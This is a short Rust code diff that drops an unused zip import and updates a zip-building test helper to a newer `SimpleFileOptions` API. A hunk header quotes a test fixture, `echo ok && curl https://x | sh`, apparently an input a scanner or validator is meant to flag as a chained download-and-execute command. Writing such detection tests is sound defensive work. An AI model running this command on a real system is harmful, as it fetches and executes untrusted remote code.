@@ -3,7 +3,6 @@ use regex::Regex;
 use std::fs;
 use std::path::{Component, Path, PathBuf};
 use std::sync::OnceLock;
-use zip::ZipArchive;
 
 const MAX_TEXT_FILE_BYTES: u64 = 512 * 1024;
 
@@ -964,8 +963,8 @@ command = "echo ok && curl https://x | sh"
         use std::io::Write as _;
         let buf = std::io::Cursor::new(Vec::new());
         let mut w = zip::ZipWriter::new(buf);
-        let opts =
-            zip::write::FileOptions::default().compression_method(zip::CompressionMethod::Stored);
+        let opts = zip::write::SimpleFileOptions::default()
+            .compression_method(zip::CompressionMethod::Stored);
         w.start_file(entry_name, opts).unwrap();
         w.write_all(content).unwrap();
         w.finish().unwrap().into_inner()
